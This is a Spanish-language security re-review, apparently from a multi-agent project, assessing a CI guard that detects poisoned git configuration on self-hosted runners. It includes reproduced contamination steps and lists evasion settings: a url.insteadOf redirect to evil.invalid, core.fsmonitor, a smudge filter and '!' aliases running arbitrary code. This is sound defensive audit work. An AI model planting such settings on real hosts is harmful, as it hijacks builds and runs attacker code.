# Veredicto Analista -- TASK-0364, re-review acotada (ronda 2)

**Veredicto: OK-CLOSABLE.** El par del AC2 discrimina, la correccion de AC1/AC4 dice la verdad, y las
cuatro puertas del repo salen 0 en clon limpio al ancla. Quedan residuos declarados -- uno de ellos
serio -- pero ninguno bloquea el cierre de esta tarea.

Lo digo con la incomodidad por delante: **la vara la puse yo la ronda pasada**, y el maker la ha
saltado en sus tres condiciones exactas. Lo que encuentro ahora de nuevo (la guardia mira UNA sola
clave) no estaba en esa vara. Inventarlo ahora seria mover la porteria, asi que sale como residuo con
id propio, no como bloqueo.

## Tu pregunta, respondida

> El brazo limpio pasa porque se quito el override global, o porque el brazo sucio que corrio ANTES
> en ese mismo runner dejo el entorno en otro estado?

**Porque se quito el override. La hipotesis B no queda "sin descartar": queda refutada por
mecanismo**, y esto no es una inferencia de documentacion.

El valor que la guardia lee tiene exactamente tres origenes posibles: `.git/config` (local),
`~/.gitconfig` (global de usuario) y la config de sistema. El brazo sucio tiene cinco pasos --
`Set up job`, `Checkout`, la guardia, `Post Checkout`, `Complete job` -- y **las unicas escrituras de
config en todo su log son estas**:

    Copying '/home/johnb/.gitconfig' to '/home/johnb/actions-runner/_work/_temp/6160b3ab-.../.gitconfig'
    Temporarily overriding HOME='/home/johnb/actions-runner/_work/_temp/6160b3ab-...' before making global git config changes
    [command]/usr/bin/git config --global --add safe.directory /home/johnb/.../multi_agent_project_protocol
    [command]/usr/bin/git config --local gc.auto 0
    [command]/usr/bin/git config --local --unset-all extensions.worktreeConfig
    [command]/usr/bin/git config --local http.https://github.com/.extraheader AUTHORIZATION: basic ***
    [command]/usr/bin/git config --local --unset-all http.https://github.com/.extraheader   (post-job)

El `--global --add` **no toca `~/.gitconfig`**: checkout COPIA el gitconfig real a un HOME temporal y
escribe sobre la copia. Las cuatro `--local` no tocan `core.hooksPath` en ninguna. Es decir: **ningun
paso del brazo sucio tiene acceso de escritura al origen del valor que leyo.** La transicion
puesto -> sin poner no pudo producirla el brazo sucio; exigio un cambio fuera de banda. Eso es la
hipotesis A.

## Que "solo" sea solo

Diferencia completa entre los dos logs de job, con las marcas de tiempo quitadas
(`sed -E 's/^[0-9T:.Z-]+ //'` y `diff`). Son 118 y 117 lineas, y esto es TODO lo que difiere:

    1c1     < Current runner version: '2.336.0'         (la linea con BOM, solo el reloj)
    40,41   < .../_temp/6160b3ab-.../.gitconfig          UUID del HOME temporal de checkout
            > .../_temp/5691e37d-.../.gitconfig
    99,100  < PERSISTENT_GIT_METADATA CONTAMINATED hooksPath=/tmp/task0364-poisoned-hooks
            < ##[error]Process completed with exit code 1.
            > PERSISTENT_GIT_METADATA CLEAN hooksPath=unset
    105,106 < .../_temp/1a55b059-.../.gitconfig          UUID del HOME temporal del post-job
            > .../_temp/5f87f5e0-.../.gitconfig

Todo lo demas es **identico byte a byte**: mismo runner (`protocol-linux`, maquina `JballPC`), mismo
directorio de trabajo, mismo `git version 2.43.0`, mismo `clean -ffdx` + `reset --hard HEAD`, mismo
`Deleted branch main (was 17a04fb507)`, mismo fetch de `17a04fb5`.

Y ahora la parte honesta, porque la pediste explicita: **desde la evidencia de CI no puedo probar que
en el host no cambiara nada mas** en los 95 s que van de `20:30:14Z` a `20:31:49Z`. Lo que si puedo
afirmar es que **da igual**: los dos logs coinciden en todo salvo en el valor leido, asi que ningun
otro cambio del host tuvo efecto observable sobre este job. El par discrimina sobre exactamente un
bit, y ese bit es el que la guardia lee.

## Que el fallo del brazo sucio sea del gate y no colateral

Del API de pasos, no del resumen del maker:

    job 94584608517 (sucio, intento 2)
      1 Set up job                                    success
      2 Checkout                                      success
      3 Reject persistent Git metadata contamination  FAILURE   <- el gate
      6 Post Checkout                                 success
      7 Complete job                                  success

    job 94585084015 (limpio, intento 3)
      1..7  todos success                             PERSISTENT_GIT_METADATA CLEAN hooksPath=unset

Muere **en** el paso que lo caza, con su propio mensaje, despues de un checkout que salio bien. No es
colateral.

## Que el contaminante sobreviva DE VERDAD

Reproducido por mi en clon limpio, con HOME aislado:

    --- baseline ---
    status entries: 0
    GUARD=CLEAN hooksPath=unset

    --- A: poison global de usuario, luego clean -ffdx + reset --hard HEAD ---
    $ git config --global core.hooksPath /tmp/poison-A
    $ git clean -ffdx && git reset --hard HEAD
    status entries after clean+reset: 0            <- el detector de workspace no ve nada
    GUARD=CONTAMINATED hooksPath=.../poison-A      <- sobrevive a las dos ordenes

Sobrevive, y es invisible a `git status --porcelain=v1 -uall --ignored`. La afirmacion que sostiene el
AC entero es **cierta**.

## Intente romper la guardia. En su propio vector, no encontre fuga

Cuatro cargas utiles propias contra el detector verbatim de la guardia:

| # | Carga | Resultado |
|---|-------|-----------|
| B | global **y** repo-local puestos a la vez | `--get` devuelve el local, exit 0 -> `CONTAMINATED`. No hay fuga |
| C | dos entradas `hooksPath` en el MISMO fichero | `--get` exit 0, devuelve la ultima -> `CONTAMINATED`. **El `\|\| true` no produce un CLEAN falso** |
| D | inyeccion por entorno `GIT_CONFIG_COUNT`/`GIT_CONFIG_KEY_0` | `CONTAMINATED`. No hay fuga |

La C la busque a proposito: `hooks_path="$(git config --get ... || true)"` se traga el exit code, asi
que un `--get` que fallara dejaria la variable vacia y la guardia diria CLEAN. No se pudo: con valores
duplicados `git config --get` sale 0 y devuelve el ultimo.

## La fuga que SI encontre (residuo, no bloqueo)

La guardia lee **una sola clave**. Con `core.hooksPath` sin poner, deje el host con esto -- todo
global de usuario, todo superviviente a `clean -ffdx` + `reset --hard HEAD`, todo invisible a
`git status` -- y la guardia imprimio `GUARD=CLEAN hooksPath=unset`:

    core.autocrlf=true                                      deriva de fin de linea
    core.fsmonitor=<ruta>                                   git INTENTO lanzarlo: "error: cannot spawn"
    url.https://evil.invalid/.insteadOf=https://github.com/ redirige el fetch del propio runner
    alias.status=!<script>                                  codigo arbitrario
    filter.evil.smudge=<script>                             codigo arbitrario en el checkout

El de `insteadOf` es el afilado: reapunta **de donde el runner se descarga el repositorio**, y la
guardia no lo ve. `core.fsmonitor` es el segundo: git llego a intentar el spawn del programa. Esta es
la clase que la guardia deja abierta, y merece id propio -- pero no es lo que el AC2 pedia acreditar.

---

## 1. Anclaje canonico

| Cosa | Valor |
|------|-------|
| Ancla del protocolo | `0311cca34c7410295f955632e1f6096d2f591b9a` (= `origin/main` al empezar) |
| Commits de remediacion | `6397ab5a`, `f52eca43`, `17a04fb5`; evidencia `0f06c31c`; entrega `0311cca3` |
| Commit de workflow de los dos brazos | `17a04fb507e53b08ce0ccadb3c4db5942f70b918` (verificado en el `head_sha` de los DOS jobs) |
| Par AC2 | run `31740992623`; sucio = intento 2 job `94584608517`; limpio = intento 3 job `94585084015` |
| Testigo AC1/AC4 | run `31740992623`, job `94584039944` (`falsification-runners`, `runner_name=protocol-win`) |
| Control AC4 anterior | run `31630955323`, job `94229262427` |
| Clon limpio | `D:/Aegis_Scratch/protocol/an0364r1/clone` (`git clone -s -n` + checkout). Clon de sondas: `.../esc` |
| Alcance | SOLO hub. Sin producto en alcance: **no** gateo `npm test`, por instruccion explicita |
| Hora | 2026-08-13 23:50 local (UTC+2) |

Nada se midio en el arbol caliente. Los clones se crearon con `-s` y `-n`, nunca con `--depth 1`.
Estado canonico antes de empezar: `validate_collaboration_state.py` exit 0 en clon limpio al ancla.

## 2. Puertas del repo, por exit code, en clon limpio al ancla

| Comando | Exit | Salida |
|---------|------|--------|
| `python scripts/validate_collaboration_state.py --root .` | **0** | `OK: collaboration state is valid.` |
| `python scripts/scan_encoding.py --root .` | **0** | `OK: encoding scan is clean.` |
| `python scripts/scan_domain_neutrality.py --root .` | **0** | -- |
| `python runtime/protocol_replay.py --check-drift --root .` | **0** | `PROTOCOL_STATE_DRIFT verdict=CLEAN up_to_seq=9086` |

Drift 0.

## 3. Tabla vector a vector (solo lo re-revisado)

| AC | Que promete | Ronda 1 | Ronda 2 | Donde lo medi |
|----|-------------|---------|---------|---------------|
| AC2 | El par sucio/limpio discrimina | FAIL | **PASS** | Mismo commit de workflow en los dos brazos; diff completo de los dos logs; fallo en el paso del gate; supervivencia reproducida. Ver 4.1-4.4 |
| AC1 (razon declarada) | El job de Windows ejercita 5.1 | SLIPS | **PASS** | 5.1 se ejecuta de verdad, y ademas el propio runner de producto lo invoca. Ver 4.5 |
| AC4 | Cada job publica su interprete; Windows, 5.1 | SLIPS | **PASS** | `5.1.26100.9168` impreso en el log, distinto de los otros dos. Ver 4.5 |
| AC1-placement, AC3, AC5, AC6, AC7 | -- | PASS | **PASS se mantiene** | Declaracion de "no tocado" verificada por `git diff`; hay una adicion. Ver 4.6 |

## 4. Detalle

### 4.1 Los dos brazos son el mismo instrumento

    GET /runs/31740992623                          head_sha=17a04fb507e53...  run_attempt=3
    GET /runs/31740992623/attempts/2/jobs   94584608517  persistent-runner-state  failure  runner=protocol-linux  steps=5
    GET /runs/31740992623/attempts/3/jobs   94585084015  persistent-runner-state  success  runner=protocol-linux  steps=5

Los dos jobs declaran el mismo `head_sha`, el mismo nombre de job y el mismo `runner_name`. Esto cierra
el motivo (b) por el que mate el par anterior: alli los brazos corrian sobre `8ccdce2a` y `43bc93f8`,
con un `Set up Python` distinto en cada uno. Aqui no hay tal cosa.

### 4.2 Refutacion de la hipotesis B

Ver la respuesta de arriba. En una linea: **el brazo sucio no tiene ningun paso capaz de escribir el
origen del valor que lee**, porque el unico `--global` del log escribe sobre la COPIA temporal del
gitconfig y las cuatro `--local` no tocan `core.hooksPath`.

Nota lateral que anoto por transparencia y que no cambia nada: los sellos de tiempo del brazo limpio
retroceden ~2 s a mitad del job (`fetch` a `20:31:54.51`, `Switched to a new branch` a `20:31:52.55`),
y el API devuelve el paso `Checkout` con duracion negativa. Es un ajuste de reloj del host durante el
job. No afecta al orden de los pasos ni al desenlace.

### 4.3 El fallo es del gate

Ver la tabla de pasos de arriba. Paso 3, mensaje propio de la guardia
(`PERSISTENT_GIT_METADATA CONTAMINATED hooksPath=/tmp/task0364-poisoned-hooks`), despues de un
`Checkout` con exito. Anoto ademas que el contaminante fue **inerte**: los logs no muestran ninguna
salida de hook, asi que no perturbo el checkout -- lo cual es justo lo que hace del par un
discriminador de un solo bit, y a la vez lo que lo hace menos realista que un contaminante que ademas
haga dano.

### 4.4 La supervivencia, reproducida

Ver el bloque de arriba. Anado el matiz que el maker no separa: el texto de la tarea dice
*"Persistent repository-local Git configuration is the replacement contaminant"* y luego cita un valor
**global de usuario**. Los dos sobreviven a `clean -ffdx` + `reset --hard HEAD`, pero no son la misma
clase: el repo-local vive en `.git/config` y desaparece si checkout decide re-clonar el workspace; el
global de usuario vive fuera y no desaparece nunca. **Lo acreditado por el par es el global.** El
texto deberia decirlo asi.

### 4.5 AC1/AC4 -- la correccion dice la verdad

Del log del job `94584039944`, verbatim, paso `Publish interpreter versions` (conclusion: success):

    ##[group]Run python --version
    python --version
    pwsh --version
    powershell.exe -NoLogo -NoProfile -NonInteractive -Command '$PSVersionTable.PSVersion.ToString()'
    shell: D:\Agentes\tools\pwsh\pwsh.EXE -command ". '{0}'"
    ##[endgroup]
    Python 3.12.10
    PowerShell 7.6.4
    5.1.26100.9168

**Tres valores distintos de tres invocaciones distintas.** El defecto que denuncie -- pwsh 7 impreso
dos veces -- esta corregido: en el control anterior (job `94229262427`) el paso llevaba el
`$PSVersionTable.PSVersion.ToString()` desnudo bajo pwsh e imprimia `Python 3.12.10 / PowerShell
7.6.4` y nada mas. Ahora `5.1.26100.9168` es Windows PowerShell 5.1 (build 26100), y no puede venir de
pwsh 7. **AC4: SLIPS curado.**

Y va mas lejos de lo que el maker declara: 5.1 **no solo se publica, se ejercita**. En el mismo job, el
propio runner de producto lo lanza:

    subprocess.CalledProcessError: Command '('powershell.exe', '-NoProfile', '-ExecutionPolicy',
    'Bypass', '-File', '...\\resolve-analista-anthropic.ps1')' returned non-zero exit status 1

Asi que la razon que el AC1 declara para poner `falsification-runners` en `protocol-win` -- *"porque
ejercita Windows PowerShell 5.1"* -- pasa de ser **falsa** (mi hallazgo de la ronda 1) a ser **cierta**.
**AC1: SLIPS curado.**

### 4.6 La declaracion de "no tocado", verificada por diff

Derivado por mi con `yaml.safe_load` sobre `6aee19ac` y `0311cca3`, sin mirar la afirmacion del maker:

    falsification-runners           steps 6 -> 6    lost=[]  gained=[]   runs-on sin cambio
    falsification-runners-python    steps 8 -> 8    lost=[]  gained=[]   runs-on sin cambio
    powershell-linux-parity         steps 10 -> 10  lost=[]  gained=[]   runs-on sin cambio
    validate                        steps 83 -> 83  lost=[]  gained=[]   runs-on sin cambio
    persistent-runner-state         ANADIDO  [self-hosted, protocol-linux]  steps=2
                                    ['Checkout', 'Reject persistent Git metadata contamination']

La declaracion *"prior passes for AC1 placement, AC3, AC5, AC6, and AC7 remain unchanged"* **no es
literalmente exacta**: hay un **quinto job nuevo**. Consecuencias, todas de texto, ninguna de garantia:

1. **AC5** sigue en pie (`cero perdida`: cambio puramente aditivo, 0 pasos perdidos en los cuatro
   jobs originales), pero la frase de cobertura del maker -- *"the four pre-clean, four
   version-publication, and four post-clean host guards ... 7/7, 80/80, 3/3, and 5/5"* -- **quedo
   obsoleta**: ahora hay cinco jobs y el quinto no lleva ninguna de esas tres guardias.
2. **AC1** pide que cada job **declare uno a uno por que va donde va**. La colocacion del quinto job
   (`protocol-linux`) **no esta declarada**. El texto solo dice que es "a bounded Linux witness job".
3. **AC6** intacto: revertir sigue siendo una linea de `runs-on`.
4. **AC3 y AC7** intactos; el run del AC3/AC7 (`31630955323`) no se toca. El run nuevo tambien sale
   sin facturar: `runs/31740992623/timing` -> `{"billable":{},"run_duration_ms":13000}`.

Ninguna de estas dos invalida los PASS de la ronda 1. Son deuda de texto, y las pongo en el saco de
residuos, no en el de bloqueos.

## 5. Un rojo nuevo en el job de Windows, que NO es de esta tarea

El rojo del job de Windows **cambio de identidad** entre mis dos rondas:

    run 31630955323 (12-ago 19:09Z)  muere en run_main_ledger_assertion_behavior_cases, linea 295
    run 31740992623 (13-ago 20:28Z)  muere ANTES, en run_agent_executable_resolution_cases, linea 469

Mi primera sospecha fue deriva del host acumulada en el runner propio -- que habria sido un hallazgo
grave y muy pertinente aqui. **El `git diff` la desmiente**: `run_agent_executable_resolution_cases`
es un test **nuevo**, anadido entre los dos anclas (+59 lineas en
`examples/mailbox_retry_cases/run_mailbox_retry_cases.py`, territorio de TASK-0372). No es deriva del
host; es codigo nuevo que nace rojo en este runner.

Lo que **si** merece un id propio: falla exactamente en
`powershell.exe -NoProfile -ExecutionPolicy Bypass -File <probe>.ps1`, que es **la misma forma de
invocacion que el maker declara que la politica del servicio rechaza bajo 5.1** y por la que movio el
job entero a pwsh 7. La correlacion es fuerte, pero **no la puedo probar**: el runner traga el stderr
(`subprocess.run(..., capture_output=True, check=True)`), asi que el `CalledProcessError` no lleva
diagnostico. Es un fallo sin diagnostico, y ese es su primer defecto.

No es de TASK-0364 -- esta tarea cambia el HOST, no arregla pasos -- pero es del dueno de ese test, y
si la causa es la politica del servicio, entonces es una factura de la migracion que hay que anotar.

## 6. Residuos declarados

1. **La guardia mira UNA sola clave.** Fuga ejecutada arriba (seccion "la fuga que SI encontre"):
   `url.<x>.insteadOf`, `core.fsmonitor`, `filter.*.smudge`, `alias.*` con `!`, `core.autocrlf`
   sobreviven a `clean -ffdx` + `reset --hard HEAD`, son invisibles a `git status` y la guardia dice
   `CLEAN`. El de `insteadOf` reapunta de donde el runner se descarga el repo. **Merece id propio.**
2. **El texto confunde repo-local con global de usuario** (4.4). Lo acreditado por el par es el
   global. Corregir la frase.
3. **El quinto job no declara su colocacion y la frase de cobertura quedo obsoleta** (4.6).
4. **Sigue en pie de la ronda 1, sin tocar:** los `pip install` de los jobs Linux sin version fijada
   sobre un interprete que ahora persiste; los interpretes Python divergidos (Linux 3.14.7 / Windows
   3.12.10 sin fijar).
5. **El rojo nuevo de `run_agent_executable_resolution_cases`** (seccion 5), sin diagnostico y
   posiblemente causado por la politica del servicio en `protocol-win`. **Merece id propio.**

## 7. Recomendacion de cierre

**OK-CLOSABLE.**

El AC2 esta acreditado por conducta con un par que discrimina: mismo commit de workflow en los dos
brazos, contaminante que sobrevive de verdad a las dos ordenes de limpieza y que yo he reproducido, el
brazo sucio muriendo **en** el gate, el brazo limpio pasando 5/5, y los dos logs identicos salvo en el
bit que la guardia lee. La hipotesis B no queda sin descartar: queda refutada por mecanismo. AC1 y AC4
dicen ahora la verdad, verificada en el log del run citado.

Lo que pido **antes del commit de cierre**, y que **no requiere una tercera vuelta de review** porque
es texto y no conducta:

- Corregir en el fichero de la tarea que el contaminante acreditado es **global de usuario**, no
  repo-local (residuo 2).
- Actualizar la frase de cobertura del AC5 a cinco jobs y declarar la colocacion del quinto (residuo 3).

Y pido **dos ids nuevos**, que no son de esta tarea:

- La estrechez de la guardia de metadatos (residuo 1), con la fuga de `insteadOf`/`fsmonitor`/
  `smudge` ya ejecutada y falsificable en este veredicto.
- El rojo de `run_agent_executable_resolution_cases` (residuo 5), empezando por darle diagnostico
  (propagar stderr) antes de diagnosticar la causa.

**Puertas afectadas por lo que pido:** ninguna. `validate`, `scan_encoding`, neutralidad y drift salen
0 al ancla y seguiran saliendo 0: los dos cambios son texto del fichero de tarea.

**Nota de metodo, sobre mi propia vara.** La ronda pasada enumere tres condiciones para el AC2. El
maker cumplio las tres, literalmente. La fuga que traigo hoy es real y esta ejecutada, pero es de una
clase que mi enumeracion no pedia -- el encargo que enumera recibe la enumeracion, y esta vez el que
enumero fui yo. Por eso sale como residuo con id, y no como un CHANGE-REQUIRED que llegaria tarde y
con la porteria movida.

---

*Analista, 2026-08-13 23:50 local (UTC+2). Medido en clon limpio con `git clone -s -n` al ancla
`0311cca3`; las dos sondas de fuga se corrieron en un segundo clon limpio con HOME aislado. Ninguna
afirmacion de este veredicto se apoya en el arbol caliente ni en el resumen del maker.*
